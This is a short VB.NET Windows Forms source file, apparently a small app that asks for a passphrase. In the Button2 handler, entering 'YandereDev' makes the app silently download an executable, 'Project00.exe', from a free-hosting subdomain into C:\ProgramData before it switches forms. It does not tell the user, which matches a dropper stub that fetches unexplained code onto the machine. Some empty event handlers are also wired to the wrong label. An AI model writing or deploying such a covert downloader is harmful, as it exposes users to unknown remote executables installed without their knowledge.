Public Class Form1

    Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Label5.Visible = False
    End Sub

    Private Sub Label1_Click(sender As System.Object, e As System.EventArgs) Handles Label1.Click

    End Sub

    Private Sub Label2_Click(sender As System.Object, e As System.EventArgs) Handles Label1.Click

    End Sub

    Private Sub Label3_Click(sender As System.Object, e As System.EventArgs) Handles Label1.Click

    End Sub

    Private Sub Button1_click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Label5.Visible = True
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        If TextBox1.Text = "YandereDev" Then
            My.Computer.Network.DownloadFile("https://7241840012.000webhostapp.com/Project00.exe", "C:\ProgramData\Project00.exe")
            Me.Hide()
            Form2.Show()
        End If
    End Sub
End Class
